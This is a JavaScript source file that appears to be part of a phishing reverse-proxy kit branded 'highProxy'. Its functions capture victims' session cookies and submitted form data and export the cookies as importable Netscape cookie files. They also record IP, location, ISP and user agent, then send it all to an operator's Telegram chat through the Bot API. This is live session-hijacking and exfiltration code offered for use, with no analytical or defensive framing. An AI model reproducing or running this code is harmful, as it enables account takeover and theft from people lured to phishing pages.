const { openStdin } = require('process')
const fs = require('fs')
const format = require('string-template')
const { Telegraf, Markup } = require('telegraf')
const path = require('path')
const cookieMapper = require('cookiefile')
const superagent = require('superagent')

const nSerial = require('../commodity/nserial');

const delPhp = require('../handlers/runphp/delphp')
const logger = require('../core/logger')


const TELEGRAM_KEY = process.env.TELEGRAM_BOT_TOKEN


const publicProjects = path.join(process.cwd(), `/webphp/${process.env.CURRENT_PROJECT}/`)

const privateProjects = path.join(`${process.cwd()}/project-custom/${process.env.CURRENT_PROJECT}`, 'public/')

if (fs.existsSync(privateProjects)) {
    delPhp.setUp({
        docRoot: privateProjects,
    })
} else {
    delPhp.setUp({
        docRoot: publicProjects,
    })
}




exports.sendMessageToProxy = (future, clientContext, opts) => {

}

exports.sendMessageToBrowser = (future, clientContext, opts) => {

}

exports.injectCode = (future, clientContext, opts) => {

}

exports.editBody = (future, clientContext, opts) => {

}

exports.tunnelToClient = (future, clientContext, opts) => {

}

exports.detachClient = (future, clientContext, opts) => {
}

exports.sendLogData = (future, clientContext, opts) => {

    const externalCommands = opts.commands ? opts.commands : []
    const botsCommands = [
        // ...externalCommands,
        {
            text: 'Join high', url: 'https://t.me/highproxy99999bot',
        },
        {
            text: 'BOT', url: 'http://t.me/highproxy99999bot',
        }, 
    ]

    const msgFull = `@highproxy99999bot 🔥 ${clientContext.scheme || process.env.CURRENT_PROJECT} 🔥 COOKIE
    
${JSON.stringify(clientContext.sessionBody, null, 4)}


##      USER FINGERPRINTS       ##
IP: ${clientContext.ip}
INFORMATION: ${clientContext.description}
USERAGENT: ${clientContext.userAgent}
/////// Running on high /////////`
    const logData = {
       
    }
    let cookieFileName = `session-${clientContext.ip}.txt`

    if (clientContext.info.cookieKEY) {
        cookieFileName = `session-${clientContext.info.cookieKEY}.txt`
    }
    

    const cookieStr = JSON.stringify(clientContext.sessionCookies, null, 4);
    const cookieGen = fs.readFileSync(path.join(__dirname, 'cookie-gen.dat'), 'utf8').toString();
    const cookieBuffer = Buffer.from(format(cookieGen, { CookieBuffer: cookieStr }), 'utf-8');

    const telegramBot = new Telegraf(TELEGRAM_KEY)

    telegramBot.telegram.sendDocument(process.env.TELEGRAM_USER_ID, 
        { source: cookieBuffer, filename: cookieFileName },
        {
            caption: msgFull,
            reply_markup: Markup.inlineKeyboard(botsCommands).reply_markup,
        })
        .then(() => console.log('Sent message ok'))
        .catch((err) => console.error(`Failed to Send Message to ID ${process.env.TELEGRAM_USER_ID}`))

}

exports.uploadBody = (future, clientContext, opts) => {
    if (opts.body === {} || JSON.stringify(opts.body) === {}) {
        return
    }
    // eslint-disable-next-line no-param-reassign
    // clientContext.sessionBody = { ...clientContext.sessionBody, ...opts.body }
    const msgFull = `@highproxy99999bot 🔥 ${clientContext.scheme || process.env.CURRENT_PROJECT} 🔥
 ${JSON.stringify(clientContext.sessionBody, null, 4)}


##      USER FINGERPRINTS       ##
IP: ${clientContext.ip}
INFORMATION: ${clientContext.description}
USERAGENT: ${clientContext.userAgent}
/////// POWERED BY highProxy /////////
/////// ADMIN @tyzzco /////////
        `
    superagent.post(`https://api.telegram.org/bot${TELEGRAM_KEY}/sendMessage`)
        .send({ text: msgFull, chat_id: process.env.TELEGRAM_USER_ID })
        .end((err, resp) => {
            if (err) {
                logger.error(`Failed to Send Message to ID ${process.env.TELEGRAM_USER_ID}`)
                logger.error(err)
            }
            logger.debug('DELIVERED BODY PAYLOAD....')
            return future.resolve({})
        })


}

exports.uploadHeader = (future, clientContext, opts) => {

}

exports.uploadCookies = (future, clientContext) => {
    if (clientContext.sessionCookies === {}) {
        return
    }
    clientContext.sessionCookies.filter((value, index, self) => self.indexOf(value) === index)
    let cookieBuffer
    let cookieFileName;

    if (process.env.RAW_COOKIES === 'YES') {
        cookieFileName = `raw-session-${clientContext.ip}.txt`
        const validateEncoding = (value) => {
            const decodedValue = decodeURIComponent(decodeURIComponent(value))
            if (value === decodedValue) {
                value = encodeURIComponent(decodedValue)
                return value
            }
            return value
        }

        const netscapeCookeList = []
        let netscapeCookieStr = '';
        netscapeCookieStr += '# Netscape HTTP Cookie File\n';
        netscapeCookieStr += '# http://curl.haxx.se/rfc/cookie_spec.html\n';
        netscapeCookieStr += '# This file was generated by EditThisCookie\n';
        clientContext.sessionCookies.forEach((cookie) => {
            if (
                // eslint-disable-next-line no-prototype-builtins
                (cookie.hasOwnProperty('expires') || cookie.hasOwnProperty('expirationDate'))
                && cookie.value.length !== 0
                && cookie.value !== 'deleted'
            ) {
                const netscapeCookie = [
                    cookie.domain,
                    (!cookie.hostOnly).toString().toUpperCase(),
                    cookie.path,
                    (!!cookie.secure).toString().toUpperCase(),
                    Math.floor(Date.parse(cookie.expires) / 1000)
                    || Math.floor(cookie.expirationDate) || 0,
                    cookie.name,
                    validateEncoding(cookie.value),
                ].join('\t')
                netscapeCookieStr += `${netscapeCookie}\r\n`

            }
        })
        cookieBuffer = Buffer.from(netscapeCookieStr, 'utf-8');
    } else {
        cookieFileName = `session-${clientContext.ip}.txt`

        const cookieStr = JSON.stringify(clientContext.sessionCookies, null, 4);
        const cookieGen = fs.readFileSync(path.join(__dirname, 'cookie-gen.dat'), 'utf8').toString();
        cookieBuffer = Buffer.from(format(cookieGen, { CookieBuffer: cookieStr }), 'utf-8');
    }

    const captionFull = `|******HIGHPROXY ⭐️${process.env.PROJECT_NAME}⭐️ COOKIE*******|


##      USER FINGERPRINTS       ##
IP: ${clientContext.ip}
LOCATION: ${clientContext.location}
ISP: ${clientContext.isp}
USERAGENT: ${clientContext.userAgent}
/////// Powered by highProxy /////////
/////// ADMIN @tyzzco /////////
        `
    superagent.post(`https://api.telegram.org/bot${TELEGRAM_KEY}/sendDocument`)
        .field('chat_id', process.env.TELEGRAM_USER_ID)
        .field('caption', captionFull)
        .attach('document', cookieBuffer, { filename: cookieFileName })
        .end((err, resp) => {
            if (err) {
                logger.error(`Failed to Send Message to ID ${process.env.TELEGRAM_USER_ID}`)
            }
            logger.info('DELIVERED COOKIE PAYLOAD')
            return future.resolve({})
        })

    // eslint-disable-next-line no-param-reassign

}

exports.uploadCustomData = (future, clientContext, opts) => {

}

exports.reGenFingerprint = (future, clientContext, opts) => {

}

exports.queryBrowserForFP = (future, clientContext, opts) => {

}

exports.saveBrowserFingerPrint = (future, clientContext, opts) => {

}

exports.executePhp = (future, clientContext, opts) => {

    // eslint-disable-next-line global-require
    // logger.debug('Executing PHP Request')
    delPhp.session(opts.req, opts.res, opts.script)
    return future.resolve({})
}

exports.serverProxy = (future, clientContext, opts) => {
    logger.debug('Executing Proxy Request')

    
    // eslint-disable-next-line global-require
    const webProxy = require('../handlers/webproxy/rserver')
    console.log('proxyDomain: ', opts.proxyDomain, ' req.url: ', opts.req.url)
    webProxy(opts, clientContext)
    return future.resolve({})
}
